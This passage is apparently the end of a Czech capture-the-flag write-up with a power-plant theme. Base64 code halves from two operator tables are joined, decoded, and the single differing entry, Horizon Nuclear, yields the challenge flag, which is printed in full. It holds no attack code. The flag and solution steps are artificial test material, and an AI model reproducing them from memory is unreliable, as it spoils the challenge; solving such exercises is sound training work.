| Granite Peak Nuclear  | QkFEQUJPT017bVNBVC1l | TFRTLWJLbkItMDcwVH0= |
| Sunnyvale Solar Farm  | QkFEQUJPT017dFpVcy1u | MGNXLTBaMU8tQk44M30= |
| Windy Plains Windpark | QkFEQUJPT017Q2ZaSC1J | clk2LWZFV24tOVNSMX0= |
| Ironclad Coal Plant   | QkFEQUJPT017SEp3Qi13 | d01GLVhRN3ctYjdpOH0= |
| Bluewave Tidal        | QkFEQUJPT017WU5RMy13 | dXBVLTFDeXQtU2puan0= |
| Mountainview Nuclear  | QkFEQUJPT017TWduWi04 | RGxMLTFtTFUtRUdYan0= |
| Greenfield Biomass    | QkFEQUJPT017a2dkby16 | NE56LThFYUwtdTVoM30= |
| Starlight Solar       | QkFEQUJPT017dFI0TC1t | TU9SLXhTa08tbGd6bH0= |
| Thunderbolt Hydro     | QkFEQUJPT017cHVpSC1n | MzljLWlPV3AtNlNJYn0= |
| Coalridge Thermal     | QkFEQUJPT017ODdVTC16 | RVg5LWtzVEIteUoxZH0= |
| Northwind Windpark    | QkFEQUJPT017cXRXbi1q | V3J2LWxUNUstMzBpaX0= |
| Horizon Nuclear       | QkFEQUZMQUd7bUtlay1F | dGJVLVNmUmEtUWxKQ30= |
| Desert Sun Solar      | QkFEQUJPT017ZDgyRC1L | YmhkLXgxOVgtTFNEQ30= |
| Rivermill Hydro       | QkFEQUJPT017Z3NvMC1Z | Qk1nLVEwMzctaVZSNn0= |
| Blackrock Coal        | QkFEQUJPT017VW5KSy1R | SktYLXZTdUwtQzFBVX0= |
| Oceanwave Tidal       | QkFEQUJPT017WE5yRS1V | bFNKLWxCTmItU1VKVn0= |
| Forestview Biomass    | QkFEQUJPT017Z21Tay10 | QjMwLVFaUHQtQjhDRH0= |
| Skylight Solar        | QkFEQUJPT017bmlKdi1n | ZmZLLTFWU2QtNGMzUn0= |
| Rapidfall Hydro       | QkFEQUJPT017YU9kdi11 | M2xCLWZHeVktWmFzYn0= |
| Ember Coal Plant      | QkFEQUJPT017YlE4Vy1w | ak1VLXY4M2UtWmFhWX0= |
| Windcrest Windpark    | QkFEQUJPT017SDlrTS1I | cWNtLTYwcHctcjZYMX0= |
| Aurora Nuclear        | QkFEQUJPT017RlJDWi1H | eUlaLWdSM1AtdFJJVn0= |
| Sunridge Solar Farm   | QkFEQUJPT017R2p4eS1Y | OWdtLTEzWTYta2ZTVn0= |

Po spojení `LEFT SD operator` a `RIGHT SD operator`

| Name                  | Code                                     |
| --------------------- | ---------------------------------------- |
| Riverbend Hydro       | QkFEQUJPT017clFGZy0zdk1MLUN5Y1EtT2hDcH0= |
| Granite Peak Nuclear  | QkFEQUJPT017bVNBVC1lTFRTLWJLbkItMDcwVH0= |
| Sunnyvale Solar Farm  | QkFEQUJPT017dFpVcy1uMGNXLTBaMU8tQk44M30= |
| Windy Plains Windpark | QkFEQUJPT017Q2ZaSC1Jclk2LWZFV24tOVNSMX0= |
| Ironclad Coal Plant   | QkFEQUJPT017SEp3Qi13d01GLVhRN3ctYjdpOH0= |
| Bluewave Tidal        | QkFEQUJPT017WU5RMy13dXBVLTFDeXQtU2puan0= |
| Mountainview Nuclear  | QkFEQUJPT017TWduWi04RGxMLTFtTFUtRUdYan0= |
| Greenfield Biomass    | QkFEQUJPT017a2dkby16NE56LThFYUwtdTVoM30= |
| Starlight Solar       | QkFEQUJPT017dFI0TC1tTU9SLXhTa08tbGd6bH0= |
| Thunderbolt Hydro     | QkFEQUJPT017cHVpSC1nMzljLWlPV3AtNlNJYn0= |
| Coalridge Thermal     | QkFEQUJPT017ODdVTC16RVg5LWtzVEIteUoxZH0= |
| Northwind Windpark    | QkFEQUJPT017cXRXbi1qV3J2LWxUNUstMzBpaX0= |
| Horizon Nuclear       | QkFEQUZMQUd7bUtlay1FdGJVLVNmUmEtUWxKQ30= |
| Desert Sun Solar      | QkFEQUJPT017ZDgyRC1LYmhkLXgxOVgtTFNEQ30= |
| Rivermill Hydro       | QkFEQUJPT017Z3NvMC1ZQk1nLVEwMzctaVZSNn0= |
| Blackrock Coal        | QkFEQUJPT017VW5KSy1RSktYLXZTdUwtQzFBVX0= |
| Oceanwave Tidal       | QkFEQUJPT017WE5yRS1VbFNKLWxCTmItU1VKVn0= |
| Forestview Biomass    | QkFEQUJPT017Z21Tay10QjMwLVFaUHQtQjhDRH0= |
| Skylight Solar        | QkFEQUJPT017bmlKdi1nZmZLLTFWU2QtNGMzUn0= |
| Rapidfall Hydro       | QkFEQUJPT017YU9kdi11M2xCLWZHeVktWmFzYn0= |
| Ember Coal Plant      | QkFEQUJPT017YlE4Vy1wak1VLXY4M2UtWmFhWX0= |
| Windcrest Windpark    | QkFEQUJPT017SDlrTS1IcWNtLTYwcHctcjZYMX0= |
| Aurora Nuclear        | QkFEQUJPT017RlJDWi1HeUlaLWdSM1AtdFJJVn0= |
| Sunridge Solar Farm   | QkFEQUJPT017R2p4eS1YOWdtLTEzWTYta2ZTVn0= |

Dekódované

| Name                  | Code                          |
| --------------------- | ----------------------------- |
| Riverbend Hydro       | BADABOOM{rQFg-3vML-CycQ-OhCp} |
| Granite Peak Nuclear  | BADABOOM{mSAT-eLTS-bKnB-070T} |
| Sunnyvale Solar Farm  | BADABOOM{tZUs-n0cW-0Z1O-BN83} |
| Windy Plains Windpark | BADABOOM{CfZH-IrY6-fEWn-9SR1} |
| Ironclad Coal Plant   | BADABOOM{HJwB-wwMF-XQ7w-b7i8} |
| Bluewave Tidal        | BADABOOM{YNQ3-wupU-1Cyt-Sjnj} |
| Mountainview Nuclear  | BADABOOM{MgnZ-8DlL-1mLU-EGXj} |
| Greenfield Biomass    | BADABOOM{kgdo-z4Nz-8EaL-u5h3} |
| Starlight Solar       | BADABOOM{tR4L-mMOR-xSkO-lgzl} |
| Thunderbolt Hydro     | BADABOOM{puiH-g39c-iOWp-6SIb} |
| Coalridge Thermal     | BADABOOM{87UL-zEX9-ksTB-yJ1d} |
| Northwind Windpark    | BADABOOM{qtWn-jWrv-lT5K-30ii} |
| Horizon Nuclear       | BADAFLAG{mKek-EtbU-SfRa-QlJC} |
| Desert Sun Solar      | BADABOOM{d82D-Kbhd-x19X-LSDC} |
| Rivermill Hydro       | BADABOOM{gso0-YBMg-Q037-iVR6} |
| Blackrock Coal        | BADABOOM{UnJK-QJKX-vSuL-C1AU} |
| Oceanwave Tidal       | BADABOOM{XNrE-UlSJ-lBNb-SUJV} |
| Forestview Biomass    | BADABOOM{gmSk-tB30-QZPt-B8CD} |
| Skylight Solar        | BADABOOM{niJv-gffK-1VSd-4c3R} |
| Rapidfall Hydro       | BADABOOM{aOdv-u3lB-fGyY-Zasb} |
| Ember Coal Plant      | BADABOOM{bQ8W-pjMU-v83e-ZaaY} |
| Windcrest Windpark    | BADABOOM{H9kM-Hqcm-60pw-r6X1} |
| Aurora Nuclear        | BADABOOM{FRCZ-GyIZ-gR3P-tRIV} |
| Sunridge Solar Farm   | BADABOOM{Gjxy-X9gm-13Y6-kfSV} |

Vlajku drží `Horizon Nuclear`

## Vlajka

    FLAG{mKek-EtbU-SfRa-QlJC}
